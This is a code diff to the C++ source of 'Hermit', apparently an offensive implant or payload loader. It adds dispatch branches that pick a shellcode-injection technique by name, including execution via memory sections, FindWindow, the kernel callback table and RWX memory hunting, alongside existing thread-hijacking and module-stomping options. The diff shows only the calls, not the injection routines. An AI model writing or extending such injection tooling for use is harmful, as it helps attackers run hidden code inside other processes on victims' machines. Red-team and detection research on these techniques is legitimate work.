@@ -169,10 +169,11 @@ namespace Hermit
             return;
         }
 
+        DWORD dwTargetPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
+
         // Inject shellcode
         if (wcscmp(pState->lpPayloadTechnique, L"shellcode-injection") == 0)
         {
-            DWORD dwTargetPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
             Technique::Injection::ShellcodeInjection(
                 pState->pProcs,
                 dwTargetPID,
@@ -210,10 +211,38 @@ namespace Hermit
         }
         else if (wcscmp(pState->lpPayloadTechnique, L"thread-execution-hijacking") == 0)
         {
-            DWORD dwTargetPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
             Technique::Injection::ThreadExecutionHijacking(
                 pState->pProcs,
                 dwTargetPID,
+                bytes
+            );
+        }
+        else if (wcscmp(pState->lpPayloadTechnique, L"via-memory-sections") == 0)
+        {
+            Technique::Injection::ShellcodeExecutionViaMemorySections(
+                pState->pProcs,
+                dwTargetPID,
+                bytes
+            );
+        }
+        else if (wcscmp(pState->lpPayloadTechnique, L"via-find-window") == 0)
+        {
+            Technique::Injection::ShellcodeExecutionViaFindWindow(
+                pState->pProcs,
+                bytes
+            );
+        }
+        else if (wcscmp(pState->lpPayloadTechnique, L"via-kernel-callback-table") == 0)
+        {
+            Technique::Injection::ShellcodeExecutionViaKernelContextTable(
+                pState->pProcs,
+                bytes
+            );
+        }
+        else if (wcscmp(pState->lpPayloadTechnique, L"rwx-hunting") == 0)
+        {
+            Technique::Injection::RWXHunting(
+                pState->pProcs,
                 bytes
             );
         }
@@ -227,7 +256,6 @@ namespace Hermit
         }
         else if (wcscmp(pState->lpPayloadTechnique, L"module-stomping") == 0)
         {
-            DWORD dwTargetPID = System::Process::ProcessGetIdByName(pState->lpPayloadProcessToInject);
             Technique::Injection::ModuleStomping(
                 pState->pProcs,
                 dwTargetPID,
